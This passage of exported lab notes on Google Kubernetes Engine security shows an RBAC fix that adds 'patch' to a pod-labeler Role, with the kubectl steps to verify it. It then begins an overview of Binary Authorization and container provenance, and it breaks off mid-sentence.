9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: rbac.authorization.k8s.io/v1</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: Role</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  annotations:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  kubectl.kubernetes.io/last-applied-configuration: |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  {"apiVersion":"rbac.authorization.k8s.io/v1","kind":"Role","metadata":{"annotations":{},"name":"pod-labeler","namespace":"default"},"rules":[{"apiGroups":[""],"resources":["pods"],"verbs":["list"]}]}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  creationTimestamp: "2020-03-23T16:29:05Z"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: pod-labeler</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  namespace: default</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resourceVersion: "2883"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  selfLink: /apis/rbac.authorization.k8s.io/v1/namespaces/default/roles/pod-labeler</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  uid: c8191869-c7de-42c6-98fc-79a91d9b02a1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rules:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- apiGroups:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - ""</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resources:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - pods</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  verbs:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - list</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 450px;"></div><div class="CodeMirror-gutters" style="display: none; height: 450px;"></div></div></div></pre><p><span>Since the application requires PATCH permissions, you can add it to the &quot;verbs&quot; list of the role, which you will do now.</span></p><p><span>The </span><code>pod-labeler-fix-2.yaml</code><span> file contains the fix in it&#39;s rules/verbs section:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rules:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- apiGroups: [""] # "" refers to the core API group</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resources: ["pods"]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  verbs: ["list","patch"] # Fix 2: adding permission to patch (update) pods</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Apply the fix and view the resulting configuration.</span></p><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance, apply </span><code>fix-2</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl apply -f manifests/pod-labeler-fix-2.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">role.rbac.authorization.k8s.io/pod-labeler configured</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">serviceaccount/pod-labeler unchanged</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rolebinding.rbac.authorization.k8s.io/pod-labeler unchanged</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">deployment.apps/pod-labeler unchanged</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Identifying the application&#39;s role and permissions</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance, view the resulting change:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get role pod-labeler -oyaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: rbac.authorization.k8s.io/v1</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: Role</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  annotations:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  kubectl.kubernetes.io/last-applied-configuration: |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  {"apiVersion":"rbac.authorization.k8s.io/v1","kind":"Role","metadata":{"annotations":{},"name":"pod-labeler","namespace":"default"},"rules":[{"apiGroups":[""],"resources":["pods"],"verbs":["list","patch"]}]}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  creationTimestamp: "2020-03-23T16:29:05Z"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: pod-labeler</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  namespace: default</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resourceVersion: "8802"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  selfLink: /apis/rbac.authorization.k8s.io/v1/namespaces/default/roles/pod-labeler</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  uid: c8191869-c7de-42c6-98fc-79a91d9b02a1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rules:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- apiGroups:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - ""</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resources:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - pods</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  verbs:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - list</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - patch</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 473px;"></div><div class="CodeMirror-gutters" style="display: none; height: 473px;"></div></div></div></pre><p><span>Because the </span><code>pod-labeler</code><span> may be in a back-off loop, the quickest way to test the fix is to kill the existing pod and let a new one take its place.</span></p><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance, run the following to kill the existing pod and let the deployment controller replace it:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl delete pod -l app=pod-labeler</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">pod "pod-labeler-659c8c99d5-t96pw" deleted</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><h3 id='verifying-successful-configuration'><span>Verifying successful configuration</span></h3><p><span>Finally, verify the new </span><code>pod-labeler</code><span> is running and check that the &quot;updated&quot; label has been applied.</span></p><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance, list all pods and show their labels:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pods --show-labels</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  READY &nbsp; &nbsp; STATUS &nbsp;  RESTARTS &nbsp; NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; READY &nbsp; STATUS &nbsp;  RESTARTS &nbsp; AGE &nbsp; LABELS</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">pod-labeler-659c8c99d5-5qsmw &nbsp; 1/1 &nbsp; &nbsp; Running &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp;  31s &nbsp; app=pod-labeler,pod-template-hash=659c8c99d5,updated=1584982487.6428008</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><ol start='' ><li><p><span>View the pod&#39;s logs to verify there are no longer any errors:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl logs -l app=pod-labeler</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Attempting to list pods</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">labeling pod pod-labeler-659c8c99d5-5qsmw</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">labeling pod pod-labeler-659c8c99d5-t96pw</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><h3 id='key-take-aways'><span>Key take-aways</span></h3><ul><li><p><span>Container and API server logs will be your best source of clues for diagnosing RBAC issues.</span></p></li><li><p><span>Use RoleBindings or ClusterRoleBindings to determine which role is specifying the permissions for a pod.</span></p></li><li><p><span>API server logs can be found in Stackdriver under the Kubernetes resource.</span></p></li><li><p><span>Not all API calls will be logged to Stackdriver. Frequent, or verbose payloads are omitted by the Kubernetes&#39; audit policy used in Kubernetes Engine. The exact policy will vary by Kubernetes version, but can be found in the </span><a href='https://github.com/kubernetes/kubernetes/blob/master/cluster/gce/gci/configure-helper.sh#L740'><span>open source codebase</span></a><span>.</span></p></li></ul><h2 id='congratulations-28'><span>Congratulations!</span></h2><p><span>You&#39;ve explored role-based access (RBAC) control by assigning different permissions to user personas and granting limited API access to an application running in your cluster.</span></p><p>&nbsp;</p><h2 id='lab---google-kubernetes-engine-security-binary-authorization'><span>LAB - Google Kubernetes Engine Security: Binary Authorization</span></h2><h2 id='overview-32'><span>Overview</span></h2><p><span>One of the key security concerns for running Kubernetes clusters is knowing what container images are running inside each pod and being able to account for their origin. Establishing &quot;container provenance&quot; means having the ability to trace the source of a container to a trusted point of origin and ensuring your organization follows the desired processes during artifact (container) creation.</span></p><p><span>Some of the key concerns are:</span></p><ul><li><p><strong><span>Safe Origin</span></strong><span> - How do you ensure that all container images running in the cluster come from an approved source?</span></p></li><li><p><strong><span>Consistency and Validation</span></strong><span> - How do you ensure that all desired validation steps were completed successfully for every container build and every deployment?</span></p></li><li><p><strong><span>Integrity</span></strong><span> - How do you ensure that containers were not modified before running after their provenance was proven?</span></p></li></ul><p><span>From a security standpoint, not enforcing where images originate from presents several risks:</span></p><ul><li><p><span>A malicious actor that has compromised a container may be able to obtain sufficient cluster privileges to launch other containers from an unknown source without enforcement.</span></p></li><li><p><span>An authorized user with the permissions to create pods may be able to accidentally or maliciously run an undesired container directly inside a cluster.</span></p></li><li><p><span>An authorized user may accidentally or maliciously overwrite a docker image tag with a functional container that has undesired code silently added to it, and Kubernetes will pull and deploy that container as a part of a deployment automatically.</span></p></li></ul><p><span>To help system operators address these concerns, Google Cloud offers a capability called </span><a href='https://cloud.google.com/binary-authorization/'><span>Binary Authorization</span></a><span>. Binary Authorization is a Google Cloud managed service that works closely with GKE to enforce deploy-time security controls to ensure that only trusted container images are deployed. With Binary Authorization you can allowlist container registries, require images to be signed by trusted authorities, and centrally enforce those policies. By enforcing this policy, you can gain tighter control over your container environment by ensuring only approved and/or 